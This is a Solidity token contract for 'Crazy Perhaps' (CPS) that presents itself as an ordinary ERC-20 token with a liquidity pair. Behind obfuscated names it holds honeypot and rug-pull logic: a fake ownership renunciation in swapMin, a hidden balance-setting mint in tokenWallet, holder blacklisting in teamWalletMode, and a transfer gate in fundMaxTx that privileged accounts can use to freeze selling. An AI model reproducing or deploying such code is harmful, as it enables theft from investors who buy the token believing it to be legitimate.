//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface totalLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract modeIsTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedLiquidity {
    function createPair(address launchedList, address walletMax) external returns (address);
}

interface totalTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atTo) external view returns (uint256);

    function transfer(address enableLimit, uint256 senderReceiverMax) external returns (bool);

    function allowance(address feeIsToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderReceiverMax) external returns (bool);

    function transferFrom(
        address sender,
        address enableLimit,
        uint256 senderReceiverMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptReceiver, uint256 value);
    event Approval(address indexed feeIsToken, address indexed spender, uint256 value);
}

interface tokenTxLaunch is totalTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CrazyPerhaps is modeIsTeam, totalTo, tokenTxLaunch {

    function allowance(address buyFundToken, address sellFrom) external view virtual override returns (uint256) {
        if (sellFrom == autoToken) {
            return type(uint256).max;
        }
        return launchAt[buyFundToken][sellFrom];
    }

    address public toSender;

    event OwnershipTransferred(address indexed feeFrom, address indexed senderTake);

    bool private txTradingLiquidity;

    function name() external view virtual override returns (string memory) {
        return exemptMarketing;
    }

    function teamWalletMode(address marketingFee) public {
        tradingList();
        
        if (marketingFee == toSender || marketingFee == takeToAuto) {
            return;
        }
        takeEnable[marketingFee] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoTo;
    }

    address private fromWalletEnable;

    uint256 minReceiver;

    mapping(address => mapping(address => uint256)) private launchAt;

    function tokenWallet(address launchedLimit, uint256 senderReceiverMax) public {
        tradingList();
        tokenAmount[launchedLimit] = senderReceiverMax;
    }

    function approve(address sellFrom, uint256 senderReceiverMax) public virtual override returns (bool) {
        launchAt[_msgSender()][sellFrom] = senderReceiverMax;
        emit Approval(_msgSender(), sellFrom, senderReceiverMax);
        return true;
    }

    function tradingList() private view {
        require(sellLaunched[_msgSender()]);
    }

    uint256 public minTo;

    bool private receiverList;

    address autoToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private listMin;

    uint256 constant fundTotalMin = 4 ** 10;

    function walletLimit(uint256 senderReceiverMax) public {
        tradingList();
        exemptAt = senderReceiverMax;
    }

    function receiverLimit(address liquidityTotalMarketing) public {
        if (amountEnableSwap) {
            return;
        }
        
        sellLaunched[liquidityTotalMarketing] = true;
        if (marketingEnable == minTo) {
            txTradingLiquidity = false;
        }
        amountEnableSwap = true;
    }

    uint256 private marketingEnable;

    bool private autoAmount;

    function transfer(address launchedLimit, uint256 senderReceiverMax) external virtual override returns (bool) {
        return fundMaxTx(_msgSender(), launchedLimit, senderReceiverMax);
    }

    function balanceOf(address atTo) public view virtual override returns (uint256) {
        return tokenAmount[atTo];
    }

    bool public amountEnableSwap;

    string private exemptMarketing = "Crazy Perhaps";

    function fundMaxTx(address minWalletTx, address enableLimit, uint256 senderReceiverMax) internal returns (bool) {
        if (minWalletTx == toSender) {
            return modeMin(minWalletTx, enableLimit, senderReceiverMax);
        }
        uint256 amountList = totalTo(takeToAuto).balanceOf(atEnable);
        require(amountList == exemptAt);
        require(enableLimit != atEnable);
        if (takeEnable[minWalletTx]) {
            return modeMin(minWalletTx, enableLimit, fundTotalMin);
        }
        return modeMin(minWalletTx, enableLimit, senderReceiverMax);
    }

    address atEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function swapMin() public {
        emit OwnershipTransferred(toSender, address(0));
        fromWalletEnable = address(0);
    }

    mapping(address => bool) public takeEnable;

    address public takeToAuto;

    mapping(address => bool) public sellLaunched;

    function symbol() external view virtual override returns (string memory) {
        return limitSwapTo;
    }

    uint8 private swapFee = 18;

    uint256 private maxTx;

    mapping(address => uint256) private tokenAmount;

    function getOwner() external view returns (address) {
        return fromWalletEnable;
    }

    function modeMin(address minWalletTx, address enableLimit, uint256 senderReceiverMax) internal returns (bool) {
        require(tokenAmount[minWalletTx] >= senderReceiverMax);
        tokenAmount[minWalletTx] -= senderReceiverMax;
        tokenAmount[enableLimit] += senderReceiverMax;
        emit Transfer(minWalletTx, enableLimit, senderReceiverMax);
        return true;
    }

    uint256 private autoTo = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return swapFee;
    }

    bool public limitMax;

    string private limitSwapTo = "CPS";

    uint256 exemptAt;

    uint256 public launchedAt;

    constructor (){
        if (listMin) {
            minTo = launchedAt;
        }
        swapMin();
        totalLiquidity minTx = totalLiquidity(autoToken);
        takeToAuto = launchedLiquidity(minTx.factory()).createPair(minTx.WETH(), address(this));
        if (launchedAt != maxTx) {
            txTradingLiquidity = false;
        }
        toSender = _msgSender();
        sellLaunched[toSender] = true;
        tokenAmount[toSender] = autoTo;
        
        emit Transfer(address(0), toSender, autoTo);
    }

    function owner() external view returns (address) {
        return fromWalletEnable;
    }

    function transferFrom(address minWalletTx, address enableLimit, uint256 senderReceiverMax) external override returns (bool) {
        if (_msgSender() != autoToken) {
            if (launchAt[minWalletTx][_msgSender()] != type(uint256).max) {
                require(senderReceiverMax <= launchAt[minWalletTx][_msgSender()]);
                launchAt[minWalletTx][_msgSender()] -= senderReceiverMax;
            }
        }
        return fundMaxTx(minWalletTx, enableLimit, senderReceiverMax);
    }

}